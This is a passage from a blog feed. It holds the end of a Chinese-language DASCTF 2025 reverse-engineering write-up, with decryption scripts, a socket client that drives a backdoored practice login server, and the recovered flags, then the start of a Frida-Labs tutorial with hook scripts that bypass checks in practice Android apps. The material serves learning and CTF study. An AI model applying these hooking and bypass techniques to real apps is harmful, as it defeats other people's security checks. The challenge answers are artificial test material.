(i3 &gt;= <span class="number">30</span>) &#123;</span><br><span class="line">            r10 = <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (i3 &gt;= <span class="number">29</span>) &#123;</span><br><span class="line">            r10 = <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (i3 &gt;= <span class="number">28</span>) &#123;</span><br><span class="line">            r10 = <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (i3 &gt;= <span class="number">26</span>) &#123;</span><br><span class="line">            r10 = <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            r10 = <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Window</span> <span class="variable">window</span> <span class="operator">=</span> getWindow();</span><br><span class="line">        c.d(window, <span class="string">&quot;window&quot;</span>);</span><br><span class="line">        r10.C0(k2, k3, window, decorView, booleanValue, booleanValue2);</span><br><span class="line">        <span class="type">Window</span> <span class="variable">window2</span> <span class="operator">=</span> getWindow();</span><br><span class="line">        c.d(window2, <span class="string">&quot;window&quot;</span>);</span><br><span class="line">        r10.d(window2);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="built_in">this</span>.f1685y = (Button) findViewById(R.id.mybutton1);</span><br><span class="line">        <span class="built_in">this</span>.f1686z = (TextView) findViewById(R.id.edit_text_1);</span><br><span class="line">        <span class="built_in">this</span>.f1684A = (TextView) findViewById(R.id.edit_text_2);</span><br><span class="line">        <span class="type">String</span> <span class="variable">i4</span> <span class="operator">=</span> w.i(<span class="string">&quot;ZKIxD0oa9odiixwxZj3Mg2i1AzpMGu6JepMHD10K5Y9ornU5aAr95mGLDRY2Iv6sb7B+AGQY46Zj\ngm0NRj73+E23DldpOOOeaIg3MWUdyoxtrD5PYSD9jE+Icy08OOyoGaVpSl0Slr5tkTQ/QQfnmXCH\nKzBPPuqOaJMDOU8akvA=\n&quot;</span>, <span class="string">&quot;KeRGeA5Lr80=\n&quot;</span>);</span><br><span class="line">        w.i(<span class="string">&quot;r2hpyBZCQnOjZWHEAnRgQIpKSc15ZDtzo3BlzAFSWHKjdRj9J3ROBqNGZcsBeE5wjEJisgJbP1SF\nUEbzClFkZ7JbZ8QJZlpdzRcU73V1ZwCrRwvJN2dCcrVOSdgWJ0p8hGlV4xJWSRq6TXTrN1k8YKYO\nesAqIXx+1FJ5vjN3RVmbeEPJdEJCdaNwYcgBeE5wihkRzSR0IFqBZ2jlBCpKQoBKctJvcn9Et1VD\n/Rh4Un3WRmu4DF5fWZJFZcwIWkQGsUJSoRNKbUaTTE2lDF5/WoBOSs8HVmV/jWhG5y9ffXaESXjr\nAUJCWaNvZN0vK0Rir3JxzC5lYwDQGEPMKUVtaKlNc74lcDkFi1lWzAQrbWSmFXPYAXpOcJV2Yv8a\nIGBemhBOuHFSeGWjWU/na1Y4S9dqdd8PQF5bsnlWzXZnUXOFd2XJCVdEYdBYEP4Tej0ek2hM5nZR\neneaTFjNeXZYX6EVcMcmclpaj05O0gJcQ2OjSGLnCkZbQrdmTeB4PG5pmkpOyTAkfWKheFOzE0k4\neaVCZOYwIz57j0REsglCQlmja07PcUNFVNtNY78PcnFWsHhI2QclaXahdULsBltfB61UV8kWWnNj\nsVkU2g==\n&quot;</span>, <span class="string">&quot;4iEgikATCzE=\n&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.f1685y.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View$OnClickListenerC0168a</span>(<span class="built_in">this</span>, A(), i4, A()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">enkey_QMz2qirA80LJiOs30Efl00JsrIv+ZdrM9iB74P/nCWOrzEemEOaq2lN1/V5/rOAoTgBanJO/AcpookhVIOVdsA==</span><br><span class="line">eniv_hKH/M/v8zwVICeWlc652BZk2eA/c2g0cLpBwvWBVlphiwBBasdn9HPWk7sb/IaRh8eppZrToUwz6f1eomFJkEQ=</span><br></pre></td></tr></table></figure><p>直接看so层</p><p>Java_com_dasctf_androidfile_MainActivity_a_1p</p><p>有个明显的RC4，最后还有个base64，很清晰的逻辑</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202512062006539.png" alt="ffffffffffffffffff21321321"></p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64, re</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4, AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line">txt = <span class="built_in">open</span>(<span class="string">&quot;截获包含flag的数据包.txt&quot;</span>,<span class="string">&quot;r&quot;</span>,encoding=<span class="string">&quot;utf-8&quot;</span>).read()</span><br><span class="line">first, rest = txt.split(<span class="string">&quot;&lt;-encryptinput-&gt;&quot;</span>, <span class="number">1</span>)</span><br><span class="line">aes_b64 = rest.split(<span class="string">&quot;\n&quot;</span>)[<span class="number">0</span>].strip()</span><br><span class="line"></span><br><span class="line">rc4_plain = ARC4.new(<span class="string">b&quot;REVERSE&quot;</span>).decrypt(base64.b64decode(first)).decode()</span><br><span class="line">key_b64, iv_b64 = rc4_plain[<span class="built_in">len</span>(<span class="string">&quot;enkey_&quot;</span>):].split(<span class="string">&quot;eniv_&quot;</span>)</span><br><span class="line">key_b64 = <span class="string">&quot;&quot;</span>.join(key_b64.split())</span><br><span class="line">iv_b64  = <span class="string">&quot;&quot;</span>.join(iv_b64.split())</span><br><span class="line"></span><br><span class="line">pem_priv = re.search(<span class="string">r&quot;-----BEGIN PRIVATE KEY-----\\s*(.+?)\\s*-----END PRIVATE KEY-----&quot;</span>, txt, re.S).group(<span class="number">1</span>).replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">priv = RSA.import_key(<span class="string">&quot;-----BEGIN PRIVATE KEY-----\n&quot;</span>+pem_priv+<span class="string">&quot;\n-----END PRIVATE KEY-----&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rsa_raw</span>(<span class="params">b64_ct</span>):</span><br><span class="line">  ct = <span class="built_in">int</span>.from_bytes(base64.b64decode(b64_ct), <span class="string">&quot;big&quot;</span>)</span><br><span class="line">  pt = <span class="built_in">pow</span>(ct, priv.d, priv.n).to_bytes((priv.size_in_bits()+<span class="number">7</span>)//<span class="number">8</span>, <span class="string">&quot;big&quot;</span>)</span><br><span class="line">  <span class="keyword">while</span> pt <span class="keyword">and</span> pt[<span class="number">0</span>]==<span class="number">0</span>: pt = pt[<span class="number">1</span>:]</span><br><span class="line">  <span class="keyword">return</span> pt</span><br><span class="line">aes_key = rsa_raw(key_b64)</span><br><span class="line">aes_iv  = rsa_raw(iv_b64)</span><br><span class="line"></span><br><span class="line">cipher_bytes = base64.b64decode(aes_b64)</span><br><span class="line">flag = unpad(AES.new(aes_key, AES.MODE_CBC, aes_iv).decrypt(cipher_bytes), <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(flag.decode())</span><br></pre></td></tr></table></figure><p>DASCTF{android_encrypto_file_and_plains}</p><h2 id="androidfff"><a href="#androidfff" class="headerlink" title="androidfff"></a>androidfff</h2><p>flutter逆向</p><p>先用blutter导出name然后导入IDA分析，blutter产生以下文件</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202512062004516.png" alt="image-20251206200421439"></p><p>把ida_script导入ida即可</p><p>然后看asm的main.dart,可以发现_checkFlag</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202512062004921.png" alt="image-20251206200432694"></p><p>_checkFlag（起始 0x29c7b0）的逻辑块在文件中 _checkFlag(&#x2F;* No info *&#x2F;)段。这里能看到</p><p>LoadField 取 TextEditingController 的文本</p><p>调 _xorEncrypt（bl #0x29cb18）</p><p>取构造函数里写死的列表 field_1b；</p><p>调 ListEquality.equals</p><p>_xorEncrypt 本体在同一文件的 “_xorEncrypt(&#x2F;* No info *&#x2F;)” 段</p><p>入口创建 CodeUnits 对象，保存输入字符串；</p><p>取闭包地址 [pp+0xc038]（注释 “AnonymousClosure … _xorEncrypt (0x29cb18)”）创建闭包；</p><p>闭包体就在 _xorEncrypt 段后面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cipher = [236,230,194,226,204,232,146,168,188,142,140,140,174,128,218,182,130,218,130,186,218,174,166,130,150,158]</span><br><span class="line">flag = &#x27;&#x27;.join(chr((v &gt;&gt; 1) ^ 0x32) for v in cipher)</span><br><span class="line">print(flag)  # DASCTF&#123;flutter_is_so_easy&#125;</span><br></pre></td></tr></table></figure><p>DASCTF{flutter_is_so_easy}</p><h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p>server里有个RSA</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202512062045281.png" alt="image-20251206204512130"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">KEY = <span class="string">b&quot;qwertyui&quot;</span>  <span class="comment"># RC4 key</span></span><br><span class="line"></span><br><span class="line">magic1 =</span><br><span class="line"><span class="built_in">bytes</span>.fromhex(<span class="string">&quot;1638e0eb936140b5527033292cbefcd73b55cfc7fb79df51ae3768a0dd9c84ae4580e47a5133b425f4c93eac97e4b1aa0b4cd30589d004f6d0d19fcbc709e86cc2996b433d29f650b69987a466f05bef7f69945860dcc44742a511f3621385c89fbd4d73153615789634b25cfc3151a4115bc30c96979e5f965290f36a863e3378b</span></span><br><span class="line"><span class="string">5cfc9ba31438c4bae22b23ef815edf7cf1771803bd392a5072b468900b75f5a4377d1daf3d6f7b7b6850d1a4a4134f2f65840efaa9b83d31083051df0fc80a786529159484f62bbb9524f68285f48c7ab8e03bdfeca1a6025aaed9f9728b390689c0c963920c728eb5695fcb9413f9f4e06d3b93db40e26d6275c84e6126a&quot;</span>)</span><br><span class="line">magic2 =</span><br><span class="line"><span class="built_in">bytes</span>.fromhex(<span class="string">&quot;373a2a27b38fd778c716728ebb95be89a0a057109119a08d5ce49261ebb0e0776d254a40c4d21bd2463e61608771de401eed13ac6660d996bea8c8b82bdd0eaf56c38466776eba31f7b2219230b654a77ec0af395a01c31c139a4f6b7b8ba845192096165dd7acd0331e79dbe434ed8c9a66581d26f69e5faa295f66010076b91a6</span></span><br><span class="line"><span class="string">dd61db7abd325f8bd25d928debcc02e5555ff81f7ae3e548e3e4659a37f5d3d3c39fbcad1b583e42fb04fa328ebb77e7841f45b711e77ee23e11989db2c0e06b8191a456d56bd1a7d42c47fdfdf1179228b57c6efca9b9b6a7d22682e5b67c7c46a877fb677f5f317b4823fcdc812f0362be27c0f5453037148ed30127b26&quot;</span>)</span><br><span class="line">magic3 =</span><br><span class="line"><span class="built_in">bytes</span>.fromhex(<span class="string">&quot;add1d11960c22d9166dac3c26725c81909176b238e3003aa57aacba0a226b7c31c220b8d209cb495b55db4e27d4e438e088000000000000009820000000000001082000000000000188300000000000020840000000000000000000000000000637c777bf26b6fc53001672bfed7ab76ca82c97dfa5947f0add4a2af9ca472c0b7f</span></span><br><span class="line"><span class="string">d9326363ff7cc34a5e5f171d8311504c723c31896059a071280e2eb27b27509832c1a1b6e5aa0523bd6b329e32f8453d100ed20fcb15b6acbbe394a4c58cfd0efaafb434d338545f9027f503c9fa851a3408f929d38f5bcb6da2110fff3d2cd0c13ec5f974417c4a77e3d645d197360814fdc222a908846eeb814de5e0bdb&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4</span>(<span class="params">key: <span class="built_in">bytes</span>, data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">  S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>)); j = <span class="number">0</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">      j = (j + S[i] + key[i % <span class="built_in">len</span>(key)]) &amp; <span class="number">0xFF</span></span><br><span class="line">      S[i], S[j] = S[j], S[i]</span><br><span class="line">  i = j = <span class="number">0</span>; out = <span class="built_in">bytearray</span>()</span><br><span class="line">  <span class="keyword">for</span> b <span class="keyword">in</span> data:</span><br><span class="line">      i = (i + <span class="number">1</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">      j = (j + S[i]) &amp; <span class="number">0xFF</span></span><br><span class="line">      S[i], S[j] = S[j], S[i]</span><br><span class="line">      out.append(b ^ S[(S[i] + S[j]) &amp; <span class="number">0xFF</span>])</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">bytes</span>(out)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_stage</span>(<span class="params">sock, payload: <span class="built_in">bytes</span></span>):</span><br><span class="line">  sock.sendall(rc4(KEY, payload))</span><br><span class="line">  resp = rc4(KEY, sock.recv(<span class="number">4096</span>))</span><br><span class="line">  <span class="built_in">print</span>(resp)</span><br><span class="line">  <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">  <span class="keyword">with</span> socket.create_connection((<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">8080</span>)) <span class="keyword">as</span> s:</span><br><span class="line">      send_stage(s, <span class="string">b&quot;req login...&quot;</span>)</span><br><span class="line">      send_stage(s, magic1)</span><br><span class="line">      send_stage(s, magic2)</span><br><span class="line">      send_stage(s, magic3)</span><br><span class="line">      <span class="comment"># 继续读 flag</span></span><br><span class="line">      <span class="built_in">print</span>(rc4(KEY, s.recv(<span class="number">4096</span>)))</span><br></pre></td></tr></table></figure><ul><li>account: aassddffgghhjjll</li><li>key: qqwweerrttyyuuii</li></ul><p>Server：handle_client(0x29C0) 调用 rsa_priv_decrypt(0x73B2) </p><p>sub_73B2 用 .rodata 里的十六进制字符串 rsa_{n,e,p,q,d}_hex 生成 RSA 私钥，并用 RSA_private_decrypt(…, padding&#x3D;OAEP) 解密收到的密文。但解出的结果仅存入局部变量，未参与任何校验，后面仅比较收到的 RC4 明文是否等于 magic_stage1&#x2F;2&#x2F;3，构成后门。</p><p>Client：sub_5042 用同样的 rsa_{n,e,p,q}_hex 构建 RSA 公钥，RSA_public_encrypt(…, padding&#x3D;OAEP) 加密 account、key，配合 AES-CBC 加密 passwd 发送。解出的明文实际上是</p><p>这里调了4125为AES加密，account是IV</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202512062043326.png" alt="image-20251206204343239"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">iv  = <span class="string">b&#x27;aassddffgghhjjll&#x27;</span>          <span class="comment"># RSA 解出 account（IV）</span></span><br><span class="line">key = <span class="string">b&#x27;qqwweerrttyyuuii&#x27;</span>          <span class="comment"># RSA 解出 key</span></span><br><span class="line"></span><br><span class="line">ct = <span class="built_in">bytes</span>.fromhex(</span><br><span class="line"><span class="string">&quot;add1d11960c22d9166dac3c26725c81909176b238e3003aa57aacba0a226b7c&quot;</span></span><br><span class="line"><span class="string">&quot;31c220b8d209cb495b55db4e27d4e438e0880000000000000098200000000000&quot;</span></span><br><span class="line"><span class="string">&quot;0108200000000000018830000000000002084000000000000000000000000000&quot;</span></span><br><span class="line"><span class="string">&quot;00637c777bf26b6fc53001672bfed7ab76ca82c97dfa5947f0add4a2af9ca47&quot;</span></span><br><span class="line"><span class="string">&quot;2c0b7fd9326363ff7cc34a5e5f171d8311504c723c31896059a071280e2eb27&quot;</span></span><br><span class="line"><span class="string">&quot;b27509832c1a1b6e5aa0523bd6b329e32f8453d100ed20fcb15b6acbbe394a4&quot;</span></span><br><span class="line"><span class="string">&quot;c58cfd0efaafb434d338545f9027f503c9fa851a3408f929d38f5bcb6da2110&quot;</span></span><br><span class="line"><span class="string">&quot;fff3d2cd0c13ec5f974417c4a77e3d645d197360814fdc222a908846eeb814d&quot;</span></span><br><span class="line"><span class="string">&quot;e5e0bdb&quot;</span>)</span><br><span class="line"></span><br><span class="line">pt = AES.new(key, AES.MODE_CBC, iv).decrypt(ct)</span><br><span class="line">flag = pt.split(<span class="string">b&#x27;\x06&#x27;</span>)[<span class="number">0</span>]  <span class="comment"># 去掉 PKCS#7 padding</span></span><br><span class="line"><span class="built_in">print</span>(flag.decode())</span><br></pre></td></tr></table></figure><p>DASCTF{dqmaxfwkm921kr21m;df1m1dqmlk1d12d1}</p><ul><li><p>RSA逻辑：sub_5042(0x5042) 里用 .rodata 的 n&#x2F;e&#x2F;p&#x2F;q&#x2F;d 做 BN_hex2bn→RSA_new→RSA_set0_key&#x2F;factors，然后 RSA_public_encrypt(…, RSA_PKCS1_OAEP_PADDING)；main 先 sub_5302 读 config 再用它加密 account&#x2F; key 两段发送。account 明文即后续 AES 的 IV，key 明文即 AES key。</p><ul><li>AES逻辑：sub_49DD 调 sub_4125（AES-128-CBC），用 key&#x3D;上一步明文，IV&#x3D;account 明文，对 passwd 做加密。RC4 发送的第三段（服务端 magic_stage3）就是这个 AES 密文。</li></ul></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;DASCTF-2025下半年赛-RE-wp&quot;&gt;&lt;a href=&quot;#DASCTF-2025下半年赛-RE-wp&quot; class=&quot;headerlink&quot; title=&quot;DASCTF 2025下半年赛 RE wp&quot;&gt;&lt;/a&gt;DASCTF 2025下半年赛 RE wp&lt;/</summary>
      
    
    
    
    <category term="CTF wp" scheme="http://matriy330.github.io/categories/CTF-wp/"/>
    
    
    <category term="wp" scheme="http://matriy330.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>Frida 学习(Frida-Labs)</title>
    <link href="http://matriy330.github.io/fc586b74/"/>
    <id>http://matriy330.github.io/fc586b74/</id>
    <published>2025-12-03T14:17:37.000Z</published>
    <updated>2025-12-03T14:17:52.685Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Frida-学习-Frida-Labs"><a href="#Frida-学习-Frida-Labs" class="headerlink" title="Frida 学习(Frida-Labs)"></a>Frida 学习(Frida-Labs)</h1><p>不能当Ai高手，还得学学</p><p>练习项目地址：<a href="https://github.com/DERE-ad2001/Frida-Labs/tree/main">DERE-ad2001&#x2F;Frida-Labs: The repo contains a series of challenges for learning Frida for Android Exploitation.</a></p><h2 id="Frida-0x1"><a href="#Frida-0x1" class="headerlink" title="Frida 0x1"></a>Frida 0x1</h2><p>i是random出来的，我们要向输出可以重新调用check</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202512031316875.png" alt="image-20251203131629772"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="title class_">MainActivity</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x1.MainActivity&quot;</span>);</span><br><span class="line">    <span class="title class_">MainActivity</span>[<span class="string">&quot;check&quot;</span>].<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">i, i2</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;check is called&#x27;</span> + <span class="string">&#x27;, &#x27;</span> + <span class="string">&#x27;i: &#x27;</span> + i + <span class="string">&#x27;, &#x27;</span> + <span class="string">&#x27;i2: &#x27;</span> + i2);</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">check</span>(<span class="number">1</span>, <span class="number">6</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="title class_">MainActivity</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x1.MainActivity&quot;</span>);</span><br><span class="line">    <span class="title class_">MainActivity</span>.<span class="property">check</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">i, i2</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;check is called&#x27;</span> + <span class="string">&#x27;, &#x27;</span> + <span class="string">&#x27;i: &#x27;</span> + i + <span class="string">&#x27;, &#x27;</span> + <span class="string">&#x27;i2: &#x27;</span> + i2);</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">check</span>(<span class="number">1</span>, <span class="number">6</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>都行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U -F -l .\frida0x1.js</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U -f com.ad2001.frida0x2 -l frida1.js</span><br></pre></td></tr></table></figure><h2 id="Frida-0x2"><a href="#Frida-0x2" class="headerlink" title="Frida 0x2"></a>Frida 0x2</h2><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202512031339994.png" alt="image-20251203133944934"></p><p>未被调用，需要主动调用</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">frida_2</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="title class_">MainActivity</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x2.MainActivity&quot;</span>);</span><br><span class="line">    <span class="title class_">MainActivity</span>.<span class="title function_">get_flag</span>(<span class="number">4919</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Frida-0x3"><a href="#Frida-0x3" class="headerlink" title="Frida 0x3"></a>Frida 0x3</h2><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202512031341510.png" alt="image-20251203134118423"></p><p>需要hook checker.code</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x3.Checker&quot;</span>);</span><br><span class="line">    a.<span class="property">code</span>.<span class="property">value</span> = <span class="number">0x200</span>;</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure><h2 id="Frida-0x4"><a href="#Frida-0x4" class="headerlink" title="Frida 0x4"></a>Frida 0x4</h2><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202512032026239.png" alt="image-20251203202613186"></p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202512032025808.png" alt="image-20251203202555760"></p><p>没有对类实例化</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">frida_5</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x4.Check&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> check = a.$new();</span><br><span class="line">    <span class="keyword">var</span> flag = check.<span class="title function_">get_flag</span>(<span class="number">0x539</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;flag: &quot;</span>,flag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Frida-0x5"><a href="#Frida-0x5" class="headerlink" title="Frida 0x5"></a>Frida 0x5</h2><p>与上题不同，已经初始化了这个实例</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202512032030264.png" alt="image-20251203203001191"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">frida_5</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&#x27;com.ad2001.frida0x5.MainActivity&#x27;</span>,&#123;</span><br><span class="line">        <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">            instance.<span class="title function_">flag</span>(<span class="number">1337</span>)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Frida-0x6"><a href="#Frida-0x6" class="headerlink" title="Frida 0x6"></a>Frida 0x6</h2><p>接受一个对象实例化</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202512032043574.png" alt="image-20251203204332491"></p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202512032043992.png" alt="image-20251203204341947"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">frida_6</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&#x27;com.ad2001.frida0x6.MainActivity&#x27;</span>,&#123;</span><br><span class="line">        <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">            <span 